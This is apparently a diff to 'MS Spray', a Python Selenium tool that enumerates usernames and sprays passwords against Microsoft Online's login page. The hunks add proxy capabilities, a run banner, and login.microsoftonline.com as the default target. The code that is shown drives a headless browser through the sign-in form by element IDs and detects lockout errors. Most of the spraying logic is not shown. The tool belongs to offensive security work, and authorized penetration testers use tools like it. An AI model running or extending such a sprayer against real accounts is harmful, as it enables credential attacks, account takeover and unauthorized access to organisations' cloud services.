@@ -3,12 +3,13 @@
 
 """A basic username enumeration and password spraying tool aimed at spraying MS Online's DOM based authentication."""
 
-
 from sys import exit
 from time import sleep
 from argparse import ArgumentParser
 from collections import OrderedDict
-from selenium.webdriver import Firefox, FirefoxProfile
+
+# Import selenium packages
+from selenium.webdriver import Firefox, FirefoxProfile, DesiredCapabilities
 from selenium.common.exceptions import TimeoutException, WebDriverException
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.by import By
@@ -16,17 +17,22 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.common.proxy import Proxy, ProxyType
 from selenium.webdriver.firefox.options import Options
 
+# Handle deprecation warnings for the time being
+import warnings
+warnings.filterwarnings("ignore", category=DeprecationWarning) 
 
-# Mapping of command line arguments to a more readable string for outputting
-args_map = OrderedDict([("target", "Target URL"), ("usernames", "Username File"), ("passwords", "Password File"),
-                        ("count", "Password Attempt Count"), ("lockout", "Lockout Reset Time"), 
-                        ("verbose", "Verbose"), ("proxy", "Proxy")])
 
 # Mapping of element ID's in the authentication process
-elements = {"type": "XPATH", "username": "//*[@id=\"i0116\"]", "password": "//*[@id=\"i0118\"]",
-            "button": "//*[@id=\"idSIButton9\"]", "usererror": "//*[@id=\"usernameError\"]",
-            "passerror": "//*[@id=\"passwordError\"]", "locked": "//*[@id=\"idTD_Error\"]",
-            "work": "//*[@id=\"aadTile\"]"}
+elements = {
+    "type":      "XPATH",
+    "username":  "//*[@id=\"i0116\"]",
+    "password":  "//*[@id=\"i0118\"]",
+    "button":    "//*[@id=\"idSIButton9\"]",
+    "usererror": "//*[@id=\"usernameError\"]",
+    "passerror": "//*[@id=\"passwordError\"]",
+    "locked":    "//*[@id=\"idTD_Error\"]",
+    "work":      "//*[@id=\"aadTile\"]"
+}
 
 
 # Colorized output during run
@@ -40,8 +46,8 @@ class text_colors:
 class BrowserEngine:
 
     options = Options()
-    profile = FirefoxProfile() # Set preferences at the class level
-    profile.set_preference("permissions.default.image", 2) # Supposed to help with memory issues
+    profile = FirefoxProfile()  # Set preferences at the class level
+    profile.set_preference("permissions.default.image", 2)  # Supposed to help with memory issues
     profile.set_preference("dom.ipc.plugins.enabled.libflashplayer.so", False)
     profile.set_preference("browser.cache.disk.enable", False)
     profile.set_preference("browser.cache.memory.enable", False)
@@ -52,19 +58,22 @@ class BrowserEngine:
     def __init__(self, wait=5, proxy=None, headless=True):
         self.proxy = None if not proxy else self.proxy(proxy)
         self.options.headless = headless
-        self.driver = Firefox(options=self.options, firefox_profile=self.profile, proxy=self.proxy)
+        self.driver = Firefox(options=self.options, firefox_profile=self.profile, desired_capabilities=self.proxy)
         self.driver.set_window_position(0, 0)  # TODO: Not sure if these help or not with optimization
         self.driver.set_window_size(1024, 768)
         self.wait = WebDriverWait(self.driver, wait)
 
     def proxy(self, proxy):
-        return Proxy({
+        proxy = Proxy({
             "proxyType": ProxyType.MANUAL,
             "httpProxy": proxy, 
             "ftpProxy":  proxy,
             "sslProxy":  proxy,
             "noProxy":   ""
         })
+        capabilities = DesiredCapabilities.FIREFOX
+        proxy.add_to_capabilities(capabilities)
+        return capabilities
 
     def quit(self):
         self.driver.quit()
@@ -326,6 +335,35 @@ def enum(args, username_list):
 
 
 
+# Print the banner
+def banner(args):
+    BANNER  = "\n             *** MS Spray ***            \n"
+    BANNER += "\n>----------------------------------------<\n"
+
+    _args = vars(args)
+    for arg in _args:
+        if _args[arg]:
+            space = ' ' * (15 - len(arg))
+
+            BANNER += "\n   > %s%s:  %s" % (arg, space, str(_args[arg]))
+
+            # Add data meanings
+            if arg == 'count':
+                BANNER += " passwords/spray"
+
+            if arg == 'lockout':
+                BANNER += " minutes"
+            
+            if arg == 'wait':
+                BANNER += " seconds"
+
+    BANNER += "\n"
+    BANNER += "\n>----------------------------------------<\n"
+
+    print(BANNER)
+
+
+
 """
 MS Online handles authentication uniquely.
 Instead of username and password fields in a single form on one page, the DOM dynamically modifies
@@ -333,7 +371,7 @@ the page to accept a username, check if it is valid, and then accept a password.
 """
 if __name__ == "__main__":
     parser = ArgumentParser(description="MS Online Password Sprayer.")
-    parser.add_argument("-t", "--target",   type=str, help="Target URL", required=True)
+    parser.add_argument("-t", "--target",   type=str, help="Target URL", default="https://login.microsoftonline.com/")
     parser.add_argument("-u", "--username", type=str, help="File containing usernames", required=True)
     parser.add_argument("-p", "--password", type=str, help="File containing passwords", required=False)
     parser.add_argument("--proxy",   type=str, help="Proxy to pass traffic through: <ip:port>", required=False)
@@ -344,7 +382,7 @@ if __name__ == "__main__":
 
     group = parser.add_mutually_exclusive_group(required=True)
 
-    group.add_argument("-e", "--enum", action="store_true", help="Perform username enumeration")
+    group.add_argument("-e", "--enum",  action="store_true", help="Perform username enumeration")
     group.add_argument("-s", "--spray", action="store_true", help="Perform password spraying")
 
     args = parser.parse_args()
@@ -356,6 +394,9 @@ if __name__ == "__main__":
             " the following: password file [--password], password count [--count]" +
             " and lockout timer in minutes [--lockout].")
         exit(1)
+
+    # Print the banner
+    banner(args)
 
     try:
         username_list = get_list_from_file(args.username)
